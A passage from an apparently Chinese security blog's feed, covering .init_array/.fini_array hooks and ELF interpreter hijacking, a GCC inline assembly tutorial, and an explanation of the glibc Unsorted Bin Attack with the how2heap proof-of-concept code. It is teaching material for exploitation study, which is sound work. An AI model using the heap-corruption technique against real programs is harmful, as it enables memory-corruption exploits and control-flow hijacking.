World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// See also: atexit(3)</span></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323012323212.png" alt="image-20230323012323212"></p><p>这个我们在<a href="https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/">https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/</a>    做过<strong>fini_array hook</strong>分析</p><p>其实就是和这个有关</p><blockquote><p><code>.init_array</code>和 <code>.fini_array</code>中存放了指向初始化代码和终止代码的函数指针。</p><p><code>.init_array</code>会在main()函数调用前执行，这样可以通过修该地址的指针来将控制流指向病毒或者寄生代码，因为比main执行还早，大部分恶意软件都是hook这个</p><p><code>.fini_array</code> 函数指针在 main() 函数执行完之后才被触发</p><p>在<code>.init_array</code> array[0]-&gt;array[1]</p><p>在<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p>我们把程序丢到ida来看一下</p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013006789.png" alt="image-20230323013006789"></p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013037782.png" alt="image-20230323013037782"></p><h3 id="谁规定是-ld-linux-x86-64-so，而不是-rtfm-so？"><a href="#谁规定是-ld-linux-x86-64-so，而不是-rtfm-so？" class="headerlink" title="谁规定是 ld-linux-x86-64.so，而不是 rtfm.so？"></a>谁规定是 <code>ld-linux-x86-64.so</code>，而不是 <code>rtfm.so</code>？</h3><p>这个我们之前也做过分析<a href="https://grxer.gitee.io/2023/03/19/23-2-21-elf/">https://grxer.gitee.io/2023/03/19/23-2-21-elf/</a></p><p>在ELF的Program Header Table 的Interpreter Path segment里规定了解释器地址，我们在有一个属于自己合理的解释器的前提下，可以完全hack掉这个程序执行流</p><h3 id="starce"><a href="#starce" class="headerlink" title="starce"></a>starce</h3><p><a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a>   里拿来分析过ls系统调用</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>RTFM—-Read The Fucking Manual</p><p>STFW—-Search The Fucking Web</p>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOW 2 GCC Inline Assembly</title>
      <link href="/2023/03/22/GCC-Inline-Assembly/"/>
      <url>/2023/03/22/GCC-Inline-Assembly/</url>
      
        <content type="html"><![CDATA[<p> 参考资料:<a href="https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html</a></p><p>​ <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html</a></p><h2 id="Asm-Syntax"><a href="#Asm-Syntax" class="headerlink" title="Asm Syntax"></a>Asm Syntax</h2><p>linux上我一般都在用GNU C 编译器 GCC，支持AT&amp;T和intel格式的内联汇编，gcc默认是att，我个人是习惯了intel格式的汇编，但是大部分操作系统源码都是att格式的内联汇编，cao</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">|       Intel Code             |      AT&amp;T Code                     |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">| mov     eax,1                |  movl    $1,%eax                   |   </span><br><span class="line">| mov     ebx,0ffh             |  movl    $0xff,%ebx                |   </span><br><span class="line">| int     80h                  |  int     $0x80                     |   </span><br><span class="line">| mov     ebx, eax             |  movl    %eax, %ebx                |</span><br><span class="line">| mov     eax,[ecx]            |  movl    (%ecx),%eax               |</span><br><span class="line">| mov     eax,[ebx+3]          |  movl    3(%ebx),%eax              | </span><br><span class="line">| mov     eax,[ebx+20h]        |  movl    0x20(%ebx),%eax           |</span><br><span class="line">| add     eax,[ebx+ecx*2h]     |  addl    (%ebx,%ecx,0x2),%eax      |</span><br><span class="line">| lea     eax,[ebx+ecx]        |  leal    (%ebx,%ecx),%eax          |</span><br><span class="line">| sub     eax,[ebx+ecx*4h-20h] |  subl    -0x20(%ebx,%ecx,0x4),%eax |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">c语言变量寻址</span><br><span class="line">intel mov eax,[_value]                at&amp;t mov _value,%eax</span><br><span class="line">at&amp;t 这样把eax的值写入0x26fa8地址处：mov    %eax,0x26fa8</span><br></pre></td></tr></table></figure><ul><li>源操作数和目的操作数顺序相反</li><li>att寄存器%前缀</li><li>att立即数前有$，16进制0x而不是后加h</li><li>att mov 操作大小’b’、’w’、’l’ 分别指明了字节（8位）、字（16位）、长型（32位）替代intel”byte ptr”、 “word ptr” 和 “dword ptr” 前缀</li><li>intel：section:[base + index*scale + disp]—&gt;att：section:disp(base, index, scale),这里立即数不用$</li></ul><h2 id="Basic-Inline"><a href="#Basic-Inline" class="headerlink" title="Basic Inline"></a>Basic Inline</h2><p>两种语法都可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code&quot;)</span><br><span class="line">__asm__(&quot;assembly code&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code1;&quot;</span><br><span class="line">    &quot;assembly code2;&quot;)</span><br><span class="line">asm(&quot;assembly code1\n\t&quot;</span><br><span class="line">    &quot;assembly code2\n\t&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666\n\t;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//切换到intel格式gcc -g -masm=intel -o test test.c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322143535231.png" alt="image-20230322143535231"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">__asm__(<span class="string">&quot;mov %rax, %rbx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $56, %rsi\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//gdb改变汇编风格set disassembly-flavor intel | att</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322144433403.png" alt="image-20230322144433403"></p><p>这样插入汇编很简单但是gcc并不知道我们改变了那些寄存器的值，gcc可能进行某些代码优化时，会用到这些寄存器但是它里面的值已经被我们插入汇编修改掉了，就会导致一些error</p><h2 id="Extended-Asm"><a href="#Extended-Asm" class="headerlink" title="Extended Asm"></a>Extended Asm</h2><p>为了解决上述问题并且和c有个更好的交互，就有了拓展汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( assembler template </span><br><span class="line">         : output operands                  <span class="comment">/* optional */</span></span><br><span class="line">         : input operands                   <span class="comment">/* optional */</span></span><br><span class="line">         : <span class="built_in">list</span> of clobbered registers      <span class="comment">/* optional */</span></span><br><span class="line">         );</span><br></pre></td></tr></table></figure><h3 id="operands"><a href="#operands" class="headerlink" title="operands"></a>operands</h3><p>总操作数的数目限制在 10 个，或者机器描述中的任何指令格式中的最大操作数数目，以较大者为准。</p><p>在汇编程序模板中，每个操作数用数字引用。编号方式从0开始，从上往下</p><ul><li>r表示我们让gcc自动帮我们去选择一个输入寄存器一个输出寄存器</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;r&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322163200644.png" alt="image-20230322163200644"></p><ul><li>如果我们想要输入和输出放在同一个寄存器</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%0,%0,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;0&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><ul><li>指定ecx寄存器,为了和操作数进行区分，寄存器我们采用两个%</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%%ecx,%%ecx,4), %%ecx&quot;</span></span><br><span class="line">     : <span class="string">&quot;=c&quot;</span> (x)</span><br><span class="line">     : <span class="string">&quot;c&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322162844426.png" alt="image-20230322162844426"></p><p>我们没有往list of clobbered registers去添加寄存器，因为目前情况gcc知道我们破坏了哪个,因为它们被显式地指定为约束了</p><h3 id="Clobber-List"><a href="#Clobber-List" class="headerlink" title="Clobber List"></a>Clobber List</h3><p><strong>如果指令隐式或显式地使用了任何其他寄存器，（并且寄存器没有出现在输出或者输出约束列表里），那么就需要在Clobber List中指定这些寄存器。</strong></p><p>如果我们的指令可以修改条件码寄存器（cc），我们必须将 “cc” 添加进修饰寄存器列表。</p><p>如果我们的指令以不可预测的方式修改了内存，那么需要将 “memory” 添加进修饰寄存器列表。</p><h3 id="Volatile修饰符"><a href="#Volatile修饰符" class="headerlink" title="Volatile修饰符"></a>Volatile修饰符</h3><p>gcc会在source–&gt;code的过程中会进行一些优化，例如删除一些代码改变一些代码位置等</p><p>为了不让gcc去优化我们的inline asm将关键词volatile 或者 __volatile__ 放置在 asm 后面、()的前面。</p><h2 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h2><h3 id="寄存器约束"><a href="#寄存器约束" class="headerlink" title="寄存器约束"></a>寄存器约束</h3><p>“reg constraints”(variable),输出操作数还要有“&#x3D;”的约束在”&#x3D;reg constraints”(variable)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br><span class="line"> q   eax, ebx, ecx, edx</span><br></pre></td></tr></table></figure><h3 id="内存操作数约束"><a href="#内存操作数约束" class="headerlink" title="内存操作数约束"></a>内存操作数约束</h3><p>“m”(variable),使用memory而不是reg作为temp来做运算</p><h3 id="匹配（数字）约束"><a href="#匹配（数字）约束" class="headerlink" title="匹配（数字）约束"></a>匹配（数字）约束</h3><p>在某些情况下，一个变量可能既充当输入操作数，也充当输出操作数。可以通过使用匹配约束在 “asm” 中指定这种情况。</p><p>asm (“incl %0” :”&#x3D;a”(var):”0”(var));</p><h3 id><a href="#" class="headerlink" title="+"></a>+</h3><p>“+”号用于指定一个操作数既可以用作输入，也可以用作输出，即输入&#x2F;输出操作数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;addl %[a], %[b]&quot;</span></span><br><span class="line">    : [b] <span class="string">&quot;+r&quot;</span> (b)</span><br><span class="line">    : [a] <span class="string">&quot;r&quot;</span> (a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>“&amp;” : 意味着这个操作数为一个早期改动的操作数，其在该指令完成前通过使用输入操作数被修改了。因此，这个操作数不可以位于一个被用作输出操作数或任何内存地址部分的寄存器。如果在旧值被写入之前它仅用作输入而已，一个输入操作数可以为一个早期改动操作数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">10</span>, fill_value = <span class="number">0x6</span>;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;stosb\n\t&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)</span><br><span class="line">        : </span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dest[i]); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//cld将标志寄存器Flag的方向标志位DF清零。DI的地址指针自动增加</span></span><br><span class="line"><span class="comment">//rep重新rcx次数的stosb把al里面的数据往rdi指向地址去写</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153906189.png" alt="image-20230322153906189"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001169 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000116d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000116e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001171 &lt;+8&gt;:    sub    rsp,0x30</span><br><span class="line">0x0000000000001175 &lt;+12&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000000000000117e &lt;+21&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">0x0000000000001182 &lt;+25&gt;:    xor    eax,eax</span><br><span class="line">0x0000000000001184 &lt;+27&gt;:    mov    DWORD PTR [rbp-0x28],0xa</span><br><span class="line">0x000000000000118b &lt;+34&gt;:    mov    DWORD PTR [rbp-0x24],0x6</span><br><span class="line">0x0000000000001192 &lt;+41&gt;:    mov    QWORD PTR [rbp-0x12],0x0</span><br><span class="line">0x000000000000119a &lt;+49&gt;:    mov    WORD PTR [rbp-0xa],0x0</span><br><span class="line">0x00000000000011a0 &lt;+55&gt;:    mov    edx,DWORD PTR [rbp-0x28]</span><br><span class="line">0x00000000000011a3 &lt;+58&gt;:    mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">0x00000000000011a6 &lt;+61&gt;:    lea    rsi,[rbp-0x12]</span><br><span class="line">0x00000000000011aa &lt;+65&gt;:    mov    ecx,edx</span><br><span class="line">0x00000000000011ac &lt;+67&gt;:    mov    rdi,rsi</span><br><span class="line">0x00000000000011af &lt;+70&gt;:    cld                   </span><br><span class="line">0x00000000000011b0 &lt;+71&gt;:    rep stos BYTE PTR es:[rdi],al</span><br><span class="line">0x00000000000011b2 &lt;+73&gt;:    mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x00000000000011ba &lt;+81&gt;:    jmp    0x11e8 &lt;main+127&gt;</span><br><span class="line">0x00000000000011bc &lt;+83&gt;:    lea    rdx,[rbp-0x12]</span><br><span class="line">0x00000000000011c0 &lt;+87&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">0x00000000000011c4 &lt;+91&gt;:    add    rax,rdx</span><br><span class="line">0x00000000000011c7 &lt;+94&gt;:    movzx  eax,BYTE PTR [rax]</span><br><span class="line">0x00000000000011ca &lt;+97&gt;:    movsx  eax,al</span><br><span class="line">0x00000000000011cd &lt;+100&gt;:    mov    esi,eax</span><br><span class="line">0x00000000000011cf &lt;+102&gt;:    lea    rax,[rip+0xe2e]        # 0x2004</span><br><span class="line">0x00000000000011d6 &lt;+109&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000000011d9 &lt;+112&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011de &lt;+117&gt;:    call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">0x00000000000011e3 &lt;+122&gt;:    add    QWORD PTR [rbp-0x20],0x1</span><br><span class="line">0x00000000000011e8 &lt;+127&gt;:    cmp    QWORD PTR [rbp-0x20],0x9</span><br><span class="line">0x00000000000011ed &lt;+132&gt;:    jbe    0x11bc &lt;main+83&gt;</span><br><span class="line">0x00000000000011ef &lt;+134&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011f4 &lt;+139&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0x00000000000011f8 &lt;+143&gt;:    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">0x0000000000001201 &lt;+152&gt;:    je     0x1208 &lt;main+159&gt;</span><br><span class="line">0x0000000000001203 &lt;+154&gt;:    call   0x1060 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x0000000000001208 &lt;+159&gt;:    leave  </span><br><span class="line">0x0000000000001209 &lt;+160&gt;:    ret    </span><br></pre></td></tr></table></figure><p>一直到+67处做好准备工作，去提升堆栈，初始化局部变量</p><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153828870.png" alt="image-20230322153828870"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a=<span class="number">10</span>, b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;mov %1, %%eax;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %%eax, %0;&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(b)       </span><br><span class="line">     :<span class="string">&quot;r&quot;</span>(a)        </span><br><span class="line">     :<span class="string">&quot;%eax&quot;</span>     </span><br><span class="line">     ); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322154308379.png" alt="image-20230322154308379"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001149 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000114d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000114e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001151 &lt;+8&gt;:    sub    rsp,0x10</span><br><span class="line">0x0000000000001155 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x8],0xa</span><br><span class="line">0x000000000000115c &lt;+19&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">0x0000000000001163 &lt;+26&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001166 &lt;+29&gt;:    mov    eax,eax</span><br><span class="line">0x0000000000001168 &lt;+31&gt;:    mov    eax,eax</span><br><span class="line">0x000000000000116a &lt;+33&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x000000000000116d &lt;+36&gt;:    mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">0x0000000000001170 &lt;+39&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001173 &lt;+42&gt;:    mov    esi,eax</span><br><span class="line">0x0000000000001175 &lt;+44&gt;:    lea    rax,[rip+0xe88]        # 0x2004</span><br><span class="line">0x000000000000117c &lt;+51&gt;:    mov    rdi,rax</span><br><span class="line">0x000000000000117f &lt;+54&gt;:    mov    eax,0x0</span><br><span class="line">0x0000000000001184 &lt;+59&gt;:    call   0x1050 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001189 &lt;+64&gt;:    mov    eax,0x0</span><br><span class="line">0x000000000000118e &lt;+69&gt;:    leave  </span><br><span class="line">0x000000000000118f &lt;+70&gt;:    ret    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Inline Asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="/2023/03/21/Unsorted-Bin-Attack/"/>
      <url>/2023/03/21/Unsorted-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="unsorted-bin-来源"><a href="#unsorted-bin-来源" class="headerlink" title="unsorted bin 来源"></a>unsorted bin 来源</h2><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li>Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取</li><li>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中</li></ul><p>我们之前做题时其实也用到了unsortedbin，去进行unlink又或去泄露libc，当时我并没有用libcserach，是因为libcsearch不支持main_arena符号，但是是支持__malloc_hook的，mallochook又在mainarena-0x10处，我们可以利用malloc_hook去定位libc</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>看一下how2heap的 unsorted_bin_attack</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321151820498.png" alt="image-20230321151820498"></p><blockquote><p>这里说下这个指针问题</p><p>p[1] &#x3D; (unsigned long)(&amp;target_var - 2);</p><p>p的类型是一个unsigned long *</p><p>tartget_var类型是unsigned long，&amp;后也是unsigned long*</p><p>所以是在(char *) p+0x8位置写入(char *)tartget_var-0x10</p></blockquote><p>现象就是我们在free掉p后将p的bk改为了target_var-0x10位置，让后我们的target_var位置被写入了unsortedbin地址</p><p>具体为什么会我们去下源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">         unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p>最关键的就是这句，由于unsortedbin是fifo的数据结构，我们再次malloc会把之前的chunk拿出来，并操作链表结构</p><p>unsorted_chunks(av)是一个函数定位到我们unsortedbin位置，把他的bk改为bck这里的bck是我们要拿出chunk的bk也就是我们改造过的地址，再把我们改造过的地址的fd(+0x10)写为unsortedbin地址，此时目的达到了，unsortedbin链表也坏掉了，不过和我们没关系&gt;_&lt;</p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><a 